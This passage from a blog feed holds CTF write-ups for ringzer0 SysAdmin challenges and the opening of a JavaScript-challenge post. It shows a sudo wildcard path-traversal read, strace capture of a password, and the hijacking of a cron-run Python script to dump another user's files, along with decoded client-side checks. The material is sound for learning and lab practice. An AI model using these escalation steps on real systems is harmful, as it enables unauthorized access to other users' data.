<span style="color:#a61717;background-color:#e3d2d2">#</span> See <span style="color:#447fcf">bash</span>(<span style="color:#3677a9">1</span>) <span style="color:#6ab825;font-weight:bold">for</span> more options
HISTCONTROL=ignoreboth

<span style="color:#a61717;background-color:#e3d2d2">#</span> append to the history file, don<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>t overwrite it
shopt -s histappend

<span style="color:#a61717;background-color:#e3d2d2">#</span> <span style="color:#6ab825;font-weight:bold">for</span> setting history length see HISTSIZE and HISTFILESIZE in <span style="color:#447fcf">bash</span>(<span style="color:#3677a9">1</span>)
HISTSIZE=<span style="color:#3677a9">1000</span>
HISTFILESIZE=<span style="color:#3677a9">2000</span>

<span style="color:#a61717;background-color:#e3d2d2">#</span> check the window size after each command and, <span style="color:#6ab825;font-weight:bold">if</span> necessary,
<span style="color:#a61717;background-color:#e3d2d2">#</span> update the values of LINES and COLUMNS.
shopt -s checkwinsize

<span style="color:#a61717;background-color:#e3d2d2">#</span> If set, the pattern <span style="color:#ed9d13">&#34;**&#34;</span> used in a pathname expansion context will
<span style="color:#a61717;background-color:#e3d2d2">#</span> match all files and zero or more directories and subdirectories.
<span style="color:#a61717;background-color:#e3d2d2">#</span>shopt -s globstar

<span style="color:#a61717;background-color:#e3d2d2">#</span> make less more friendly <span style="color:#6ab825;font-weight:bold">for</span> non-text input files, see <span style="color:#447fcf">lesspipe</span>(<span style="color:#3677a9">1</span>)
<span style="color:#a61717;background-color:#e3d2d2">#</span>[ -x /usr/bin/lesspipe ] &amp;&amp; eval <span style="color:#ed9d13">&#34;$(SHELL=/bin/sh lesspipe)&#34;</span>

<span style="color:#a61717;background-color:#e3d2d2">#</span> set variable identifying the chroot you work <span style="color:#447fcf">in</span> (used in the prompt below)
<span style="color:#6ab825;font-weight:bold">if</span> [ -z <span style="color:#ed9d13">&#34;${debian_chroot:-}&#34;</span> ] &amp;&amp; [ -r /etc/debian_chroot ]; then
    debian_chroot=<span style="color:#a61717;background-color:#e3d2d2">$</span>(cat /etc/debian_chroot)
fi

<span style="color:#a61717;background-color:#e3d2d2">#</span> set a fancy <span style="color:#447fcf">prompt</span> (non-color, unless we know we <span style="color:#ed9d13">&#34;want&#34;</span> color)
<span style="color:#6ab825;font-weight:bold">case</span> <span style="color:#ed9d13">&#34;$TERM&#34;</span> in
    xterm-color) color_prompt=yes;;
esac

<span style="color:#a61717;background-color:#e3d2d2">#</span> uncomment <span style="color:#6ab825;font-weight:bold">for</span> a colored prompt, <span style="color:#6ab825;font-weight:bold">if</span> the terminal has the capability; turned
<span style="color:#a61717;background-color:#e3d2d2">#</span> off by <span style="color:#6ab825;font-weight:bold">default</span> to not distract the user: the focus in a terminal window
<span style="color:#a61717;background-color:#e3d2d2">#</span> should be on the output of commands, not on the prompt
<span style="color:#a61717;background-color:#e3d2d2">#</span>force_color_prompt=yes
<span style="color:#6ab825;font-weight:bold">if</span> [ -n <span style="color:#ed9d13">&#34;$force_color_prompt&#34;</span> ]; then
    <span style="color:#6ab825;font-weight:bold">if</span> [ -x /usr/bin/tput ] &amp;&amp; tput setaf <span style="color:#3677a9">1</span> &gt;&amp;/dev/null; then
        <span style="color:#a61717;background-color:#e3d2d2">#</span> We have color support; assume it<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>s compliant with Ecma-<span style="color:#3677a9">48</span>
        <span style="color:#a61717;background-color:#e3d2d2">#</span> (ISO/IEC-<span style="color:#3677a9">6429</span>). (Lack of such support is extremely rare, and such
        <span style="color:#a61717;background-color:#e3d2d2">#</span> a <span style="color:#6ab825;font-weight:bold">case</span> would tend to support setf rather than setaf.)
        color_prompt=yes
    <span style="color:#6ab825;font-weight:bold">else</span>
        color_prompt=
    fi
fi

<span style="color:#6ab825;font-weight:bold">if</span> [ <span style="color:#ed9d13">&#34;$color_prompt&#34;</span> = yes ]; then
    PS1=<span style="color:#a61717;background-color:#e3d2d2">&#39;$</span>{debian_chroot:+(<span style="color:#a61717;background-color:#e3d2d2">$</span>debian_chroot)}<span style="color:#a61717;background-color:#e3d2d2">\</span>[<span style="color:#a61717;background-color:#e3d2d2">\</span><span style="color:#3677a9">033</span>[<span style="color:#3677a9">01</span>;<span style="color:#3677a9">32</span>m<span style="color:#a61717;background-color:#e3d2d2">\</span>]<span style="color:#a61717;background-color:#e3d2d2">\</span>u<span style="color:#a61717;background-color:#e3d2d2">@\</span>h<span style="color:#a61717;background-color:#e3d2d2">\</span>[<span style="color:#a61717;background-color:#e3d2d2">\</span><span style="color:#3677a9">033</span>[<span style="color:#3677a9">00</span>m<span style="color:#a61717;background-color:#e3d2d2">\</span>]:<span style="color:#a61717;background-color:#e3d2d2">\</span>[<span style="color:#a61717;background-color:#e3d2d2">\</span><span style="color:#3677a9">033</span>[<span style="color:#3677a9">01</span>;<span style="color:#3677a9">34</span>m<span style="color:#a61717;background-color:#e3d2d2">\</span>]<span style="color:#a61717;background-color:#e3d2d2">\</span>w<span style="color:#a61717;background-color:#e3d2d2">\</span>[<span style="color:#a61717;background-color:#e3d2d2">\</span><span style="color:#3677a9">033</span>[<span style="color:#3677a9">00</span>m<span style="color:#a61717;background-color:#e3d2d2">\</span>]<span style="color:#a61717;background-color:#e3d2d2">\$</span> <span style="color:#a61717;background-color:#e3d2d2">&#39;</span>
<span style="color:#6ab825;font-weight:bold">else</span>
    PS1=<span style="color:#a61717;background-color:#e3d2d2">&#39;$</span>{debian_chroot:+(<span style="color:#a61717;background-color:#e3d2d2">$</span>debian_chroot)}<span style="color:#a61717;background-color:#e3d2d2">\</span>u<span style="color:#a61717;background-color:#e3d2d2">@\</span>h:<span style="color:#a61717;background-color:#e3d2d2">\</span>w<span style="color:#a61717;background-color:#e3d2d2">\$</span> <span style="color:#a61717;background-color:#e3d2d2">&#39;</span>
fi
unset color_prompt force_color_prompt

<span style="color:#a61717;background-color:#e3d2d2">#</span> If this is an xterm set the title to user<span style="color:#a61717;background-color:#e3d2d2">@</span>host:dir
<span style="color:#6ab825;font-weight:bold">case</span> <span style="color:#ed9d13">&#34;$TERM&#34;</span> in
xterm*|rxvt*)
    PS1=<span style="color:#ed9d13">&#34;\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1&#34;</span>
    ;;
*)
    ;;
esac

<span style="color:#a61717;background-color:#e3d2d2">#</span> enable color support of ls and also add handy aliases
alias reveal=<span style="color:#ed9d13">&#34;openssl enc -aes-256-cbc -a -d -in encflag.txt.enc -k &#39;lp6PWgOwDctq5Yx7ntTmBpOISc&#39;&#34;</span>
<span style="color:#6ab825;font-weight:bold">if</span> [ -x /usr/bin/dircolors ]; then
    test -r <span style="color:#a61717;background-color:#e3d2d2">~</span>/.dircolors &amp;&amp; eval <span style="color:#ed9d13">&#34;$(dircolors -b ~/.dircolors)&#34;</span> || eval <span style="color:#ed9d13">&#34;$(dircolors -b)&#34;</span>
    alias ls=<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>ls --color=auto<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>
    <span style="color:#a61717;background-color:#e3d2d2">#</span>alias dir=<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>dir --color=auto<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>
    <span style="color:#a61717;background-color:#e3d2d2">#</span>alias vdir=<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>vdir --color=auto<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>

    <span style="color:#a61717;background-color:#e3d2d2">#</span>alias grep=<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>grep --color=auto<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>
    <span style="color:#a61717;background-color:#e3d2d2">#</span>alias fgrep=<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>fgrep --color=auto<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>
    <span style="color:#a61717;background-color:#e3d2d2">#</span>alias egrep=<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>egrep --color=auto<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>
fi

<span style="color:#a61717;background-color:#e3d2d2">#</span> some more ls aliases
<span style="color:#a61717;background-color:#e3d2d2">#</span>alias ll=<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>ls -l<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>
<span style="color:#a61717;background-color:#e3d2d2">#</span>alias la=<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>ls -A<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>
<span style="color:#a61717;background-color:#e3d2d2">#</span>alias l=<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>ls -CF<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>

<span style="color:#a61717;background-color:#e3d2d2">#</span> Alias definitions.
<span style="color:#a61717;background-color:#e3d2d2">#</span> You may want to put all your additions into a separate file like
<span style="color:#a61717;background-color:#e3d2d2">#</span> <span style="color:#a61717;background-color:#e3d2d2">~</span>/.bash_aliases, instead of adding them here directly.
<span style="color:#a61717;background-color:#e3d2d2">#</span> See /usr/share/doc/bash-doc/examples in the bash-doc <span style="color:#6ab825;font-weight:bold">package</span>.

<span style="color:#6ab825;font-weight:bold">if</span> [ -f <span style="color:#a61717;background-color:#e3d2d2">~</span>/.bash_aliases ]; then
    . <span style="color:#a61717;background-color:#e3d2d2">~</span>/.bash_aliases
fi

<span style="color:#a61717;background-color:#e3d2d2">#</span> enable programmable completion <span style="color:#447fcf">features</span> (you don<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>t need to enable
<span style="color:#a61717;background-color:#e3d2d2">#</span> this, <span style="color:#6ab825;font-weight:bold">if</span> it<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>s already enabled in /etc/bash.bashrc and /etc/profile
<span style="color:#a61717;background-color:#e3d2d2">#</span> sources /etc/bash.bashrc).
</code></pre></div><p>Do you see sth suspicious? No? Well, I do!</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">alias reveal=&#34;openssl enc -aes-256-cbc -a -d -in encflag.txt.enc -k &#39;lp6PWgOwDctq5Yx7ntTmBpOISc&#39;&#34;
</code></pre></div><p>Let&rsquo;s decrypt the file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">oracle@forensics:~$ reveal
FLAG-IaFOjjFWazycSg0lbVO3T8ZTvz
</code></pre></div><h2 id="sysadmin-part-6">SysAdmin Part 6</h2>
<p>Login as <code>trinity</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sshpass -p Flag-08grILsn3ekqhDK7cKBV6ka8B ssh trinity@for01.ringzer0team.com -p 13375

trinity@forensics:~$ ls -la
total 28
drwxr-xr-x  2 trinity trinity 4096 Mar 10  2014 .
drwxr-xr-x 10 root    root    4096 Jun 12  2014 ..
lrwxrwxrwx  1 root    root       9 Mar  9  2014 .bash_history -&gt; /dev/null
-rwxr--r--  1 trinity trinity  236 Oct 29  2015 .bash_logout
-rwxr--r--  1 trinity trinity 2638 Jul 19 06:37 .bashrc
-rw-r-----  1 neo     neo      124 Sep 20  2015 phonebook
-rwxr--r--  1 trinity trinity  675 Dec 10  2015 .profile
-rwxr-----  1 trinity trinity   23 Jul  5 16:50 .vimrc
</code></pre></div><p>Obviously only <code>neo:neo</code> can read <code>phonebook</code>. Now let&rsquo;s check for <code>sudo</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">trinity@forensics:~$ sudo -l
[sudo] password for trinity:
Matching Defaults entries for trinity on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, insults

User trinity may run the following commands on this host:
    (neo) /bin/cat /home/trinity/*
</code></pre></div><p>Now read the files:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">trinity@forensics:~$ sudo -u neo /bin/cat /home/trinity/*
The Oracle        1800-133-7133
Persephone        345-555-1244





copy made by Cypher copy utility on /home/neo/phonebook
</code></pre></div><p>Hmmm, nothing special about it. However, you can use the wildcard to go into the parent directory and
finally into <code>/home/neo/</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">trinity@forensics:~$ sudo -u neo /bin/cat /home/trinity/../neo/phonebook
The Oracle        1800-133-7133
Persephone        345-555-1244




change my current password FLAG-lRGLKGh2895wIAoOvcBbgk4oL
don&#39;t forget to remove this :)
</code></pre></div><p>Fail :)</p>
<h2 id="sysadmin-part-7">SysAdmin Part 7</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">% sshpass -p FLAG-lRGLKGh2895wIAoOvcBbgk4oL ssh neo@for01.ringzer0team.com -p 13375

         _                             ____  __                     
   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
 / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
             /____/                                                 
                                      _ _             ___ _____ ___ 
                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
                            / _ \ &#39; \| | | &#39; \/ -_) | (__  | | | _| 
                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
                                                                    

You have mail.
neo@forensics:~$ 
</code></pre></div><p>Let&rsquo;s have a look at running processes:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">neo@forensics:~$ ps fl -u neo  
F   UID   PID  PPID PRI  NI    VSZ   RSS WCHAN  STAT TTY        TIME COMMAND
4  1003 32505 32503  20   0   3944   256 -      Ss   ?          0:01 /bin/monitor
4  1003 32073 32071  20   0   3944   256 -      Ss   ?          0:01 /bin/monitor
4  1003 31844 31842  20   0   3944   256 -      Ss   ?          0:04 /bin/monitor
4  1003 31624 31622  20   0   3944   256 -      Ss   ?          0:03 /bin/monitor
4  1003 31471 31469  20   0   3944   256 -      Ss   ?          0:02 /bin/monitor
4  1003 31078 31076  20   0   3944   256 -      Ss   ?          0:02 /bin/monitor
4  1003 30040 30038  20   0   3944   256 -      Ss   ?          0:02 /bin/monitor
[...]
</code></pre></div><p>Since we can read <code>/bin/monitor</code> as user <code>neo</code> (and <code>/bin/monitor</code> was started using
<code>sudo neo -c /bin/monitor</code>) we should be able to <strong>trace</strong> its syscalls (since we are
allowed to attach to a process running as user <code>neo</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">neo@forensics:~$ strace -p32505
Process 32505 attached - interrupt to quit
restart_syscall(&lt;... resuming interrupted call ...&gt;) = 0
write(4294967295, &#34;telnet 127.0.0.1 23\n&#34;, 20) = -1 EBADF (Bad file descriptor)
write(4294967295, &#34;user\n&#34;, 5)          = -1 EBADF (Bad file descriptor)
write(4294967295, &#34;FLAG-a4UVY5HJQO5ddLc5wtBps48A3\n&#34;, 31) = -1 EBADF (Bad file descriptor)
write(4294967295, &#34;get-cpuinfo\n&#34;, 12)  = -1 EBADF (Bad file descriptor)
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
rt_sigaction(SIGCHLD, NULL, {SIG_DFL, [], 0}, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
nanosleep({10, 0},
</code></pre></div><p>Bingo! The flag is <code>FLAG-a4UVY5HJQO5ddLc5wtBps48A3</code>.</p>
<h2 id="sysadmin-part-8">SysAdmin Part 8</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">% sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13375

         _                             ____  __                     
   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
 / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
             /____/                                                 
                                      _ _             ___ _____ ___ 
                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
                            / _ \ &#39; \| | | &#39; \/ -_) | (__  | | | _| 
                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
                                                                    

You have mail.
</code></pre></div><p>I remember some information related to the user <code>cypher</code> during the previous challanges. In fact
I think I&rsquo;ve seen sth in the files located at <code>/backups</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp/bk$ cp /backup/* .
morpheus@forensics:/var/tmp/bk$ for i in *; do tar -xf $i; done
morpheus@forensics:/var/tmp/bk$ for i in *; do tar -xf $i; done
morpheus@forensics:/var/tmp/bk$ ls -ltR
.:
total 96
drwxr-xr-x 4 morpheus morpheus  4096 Sep 27 04:46 var
-rwxr-xr-x 1 morpheus morpheus 40960 Sep 27 04:46 3dab3277410dddca016834f91d172027
-rwxr-xr-x 1 morpheus morpheus 10240 Sep 27 04:46 776d27d2a429e63bbc3cb29183417bb2
-rwxr-xr-x 1 morpheus morpheus 20480 Sep 27 04:46 c074fa6ec17bb35e168366c43cf4cd19
-rwxr-xr-x 1 morpheus morpheus 10240 Sep 27 04:46 ca584b15ae397a9ad45b1ff267b55796
drwxr-xr-x 3 morpheus morpheus  4096 Sep 15  2014 home
drwxr-x--x 2 morpheus morpheus  4096 Mar 12  2014 tmp

./var:
total 8
drwxr-xr-x 3 morpheus morpheus 4096 Sep 27 04:46 spool
drwxr-xr-x 2 morpheus morpheus 4096 Sep 27 04:46 log

./var/spool:
total 4
drwxr-xr-x 5 morpheus morpheus 4096 Feb 25  2014 cron

./var/spool/cron:
total 12
drwx--x--- 2 morpheus morpheus 4096 Mar 12  2014 crontabs
drwxr-x--- 2 morpheus morpheus 4096 Feb 25  2014 atjobs
drwxr-x--- 2 morpheus morpheus 4096 Jun  9  2012 atspool

./var/spool/cron/crontabs:
total 4
-rw------- 1 morpheus morpheus 1126 Mar 12  2014 cypher

./var/spool/cron/atjobs:
total 0

./var/spool/cron/atspool:
total 0

./var/log:
total 40
-rw-r----- 1 morpheus morpheus 37172 Mar 12  2014 syslog

./home:
total 4
drwxr-x--- 3 morpheus morpheus 4096 Sep 15  2014 oracle

./home/oracle:
total 0

./tmp:
total 4
-rwxr-xr-x 1 morpheus morpheus 54 Mar 12  2014 Gathering.py
</code></pre></div><p>As you can see there is user cronjob:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp/bk$ cat ./var/spool/cron/crontabs/cypher
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.f7mcQy/crontab installed on Wed Mar 12 22:02:27 2014)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use &#39;*&#39; in these fields (for &#39;any&#39;).# 
# Notice that tasks will be started based on the cron&#39;s system
# daemon&#39;s notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
*/3 * * * * python /tmp/Gathering.py
</code></pre></div><p>So every 3 minutes <code>python /tmp/Gathering.py</code> gets executed. If we look closer, we&rsquo;ll
notice that the Python file is executed as user <code>cypher</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp/bk$ grep -r &#34;cypher&#34; *
Binary file 3dab3277410dddca016834f91d172027 matches
Binary file 776d27d2a429e63bbc3cb29183417bb2 matches
Binary file ca584b15ae397a9ad45b1ff267b55796 matches
tmp/Gathering.py:os.system(&#34;ps aux &gt; /home/cypher/info.txt&#34;)
var/log/syslog:Mar 12 22:01:58 forensics crontab[1662]: (cypher) BEGIN EDIT (cypher)
var/log/syslog:Mar 12 22:02:27 forensics crontab[1662]: (cypher) REPLACE (cypher)
var/log/syslog:Mar 12 22:02:27 forensics crontab[1662]: (cypher) END EDIT (cypher)
var/log/syslog:Mar 12 22:03:01 forensics /USR/SBIN/CRON[1682]: (cypher) CMD (python /tmp/Gathering.py)
var/log/syslog:Mar 12 22:06:01 forensics /USR/SBIN/CRON[1857]: (cypher) CMD (python /tmp/Gathering.py)
var/log/syslog:Mar 12 22:09:01 forensics /USR/SBIN/CRON[2269]: (cypher) CMD (python /tmp/Gathering.py)
</code></pre></div><p>Finally we want the Python script to read all files under <code>/home/cypher/*</code> and redirect the STDOUT
to some file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp/bk$ touch /tmp/gather.log
morpheus@forensics:/var/tmp/bk$ chmod 777 /tmp/gather.log
morpheus@forensics:/var/tmp/bk$ cat /tmp/Gathering.py
import os
os.system(&#34;cat /home/cypher/*.* &gt; /tmp/gather.log&#34;)
</code></pre></div><p>This should do the trick. Now we&rsquo;ll have to wait for the script to get executed. Every 3 minutes means that
the cronjob will run at following minutes: :00, :03, :06, :09, :12, :15, :18, :21, :24, :27, :30, :33, :36, :39, :42, :45, :48, :51, :54, :57.</p>
<p>Now wait some time till you see:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp$ ls -l /tmp/gather.log
-rwxrwxrwx 1 cypher cypher 8256 Nov 11 06:10 /tmp/gather.log
</code></pre></div><p>Now let&rsquo;s get the content:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp$ cat /tmp/gather.log
python /tmp/Gathering.py &amp;
sleep 5
echo &#34;import os&#34; &gt; /tmp/Gathering.py
echo &#34;os.system(&#39;ps aux &gt; /tmp/28JNvE05KBltE8S7o2xu&#39;)&#34; &gt;&gt; /tmp/Gathering.py
chmod 777 /tmp/Gathering.py

BASE ?
RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=
...
</code></pre></div><p>And the flag is:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ echo &#34;RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=&#34; | base64 -d
FLAG-pys3gfczt9pDkEz2io0Pwd8KNz
</code></pre></div><p>Now I can also see why I had troubles executing my python script: <code>/tmp/Gathering.py</code> is being executed and then after 5 seconds
the content of the file gets replaced.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>ringzer0 CTF - JavaScript challenges </title>
      <link>https://blog.dornea.nu/2016/10/29/ringzer0-ctf-javascript-challenges/</link>
      <pubDate>Sat, 29 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/10/29/ringzer0-ctf-javascript-challenges/</guid>
      <content:encoded><![CDATA[<p>These challenges were quite tricky since they didn&rsquo;t focus only on the JavaScript language itself but also on
all kind of stuff you can do with JavaScript: Crypto, obfuscation etc. I think they were a good opportunity
to learn more about the language itself and get some ideas how JavaScript obfuscation techniques work.</p>
<h2 id="level-1-client-side-validation-is-bad">Level 1: Client side validation is bad!</h2>
<p>Let&rsquo;s have a look at the source code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">// Look&#39;s like weak JavaScript auth script :)
$(&#34;.c_submit&#34;).click(function(event) {
    event.preventDefault()
    var u = $(&#34;#cuser&#34;).val();
    var p = $(&#34;#cpass&#34;).val();
    if(u == &#34;admin&#34; &amp;&amp; p == String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)) {
        if(document.location.href.indexOf(&#34;?p=&#34;) == -1) {   
            document.location = document.location.href + &#34;?p=&#34; + p;
        }
    } else {
        $(&#34;#cresponse&#34;).html(&#34;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password sorry.&lt;/div&gt;&#34;);
    }
});
</code></pre></div><p>That charcode decodes to: <code>JavaScriptIsSecure</code>. So the credentials are <code>admin:JavaScriptIsSecure</code>. Login in reveals the flag:
<code>FLAG-66Jq5u688he0y46564481WRh</code>.</p>
<h2 id="level-2-hashing-is-more-secure">Level 2: Hashing is more secure</h2>
<p>Again let&rsquo;s have a look at the code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">// Look&#39;s like weak JavaScript auth script :)                                                                          
$(&#34;.c_submit&#34;).click(function(event) {
    event.preventDefault();
    var p = $(&#34;#cpass&#34;).val();
    if(Sha1.hash(p) == &#34;b89356ff6151527e89c4f3e3d30c8e6586c63962&#34;) {
        if(document.location.href.indexOf(&#34;?p=&#34;) == -1) {   
            document.location = document.location.href + &#34;?p=&#34; + p;
        }
    } else {
        $(&#34;#cresponse&#34;).html(&#34;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password sorry.&lt;/div&gt;&#34;);
    }
});
</code></pre></div><p>All I had to do is to search for secret string whose hash (SHA1) is <code>b89356ff6151527e89c4f3e3d30c8e6586c63962</code>.
Here you go: <a href="http://sha1.gromweb.com/?hash=b89356ff6151527e89c4f3e3d30c8e6586c63962">http://sha1.gromweb.com/?hash=b89356ff6151527e89c4f3e3d30c8e6586c63962</a>. And the value is: <code>adminz</code>.
And finally the flag: <code>FLAG-bXNsYg9tLCaIX6h1UiQMmMYB</code>.</p>
<h2 id="level-3-then-obfuscation-is-more-secure">Level 3: Then obfuscation is more secure</h2>
<p>The source code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">// Look&#39;s like weak JavaScript auth script :)

var _0xc360=[&#34;\x76\x61\x6C&#34;,&#34;\x23\x63\x70\x61\x73\x73&#34;,&#34;\x61\x6C\x6B\x33&#34;,&#34;\x30\x32\x6C\x31&#34;,&#34;\x3F\x70\x3D&#34;,&#34;\x69\x6E\x64\x65\x78\x4F\x66&#34;,&#34;\x68\x72\x65\x66&#34;,&#34;\x6C\x6F\x63\x61\x74\x69\x6F\x6E&#34;,&#34;\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x65\x72\x72\x6F\x72\x27\x3E\x57\x72\x6F\x6E\x67\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x73\x6F\x72\x72\x79\x2E\x3C\x2F\x64\x69\x76\x3E&#34;,&#34;\x68\x74\x6D\x6C&#34;,&#34;\x23\x63\x72\x65\x73\x70\x6F\x6E\x73\x65&#34;,&#34;\x63\x6C\x69\x63\x6B&#34;,&#34;\x2E\x63\x5F\x73\x75\x62\x6D\x69\x74&#34;];$(_0xc360[12])[_0xc360[11]](function (){var _0xf382x1=$(_0xc360[1])[_0xc360[0]]();var _0xf382x2=_0xc360[2];if(_0xf382x1==_0xc360[3]+_0xf382x2){if(document[_0xc360[7]][_0xc360[6]][_0xc360[5]](_0xc360[4])==-1){document[_0xc360[7]]=document[_0xc360[7]][_0xc360[6]]+_0xc360[4]+_0xf382x1;} ;} else {$(_0xc360[10])[_0xc360[9]](_0xc360[8]);} ;} );
</code></pre></div><p>Let&rsquo;s try to <strong>deobfuscate</strong> that using <a href="https://puzzlefiles.com/Deobfuscate/">https://puzzlefiles.com/Deobfuscate/</a>:</p>
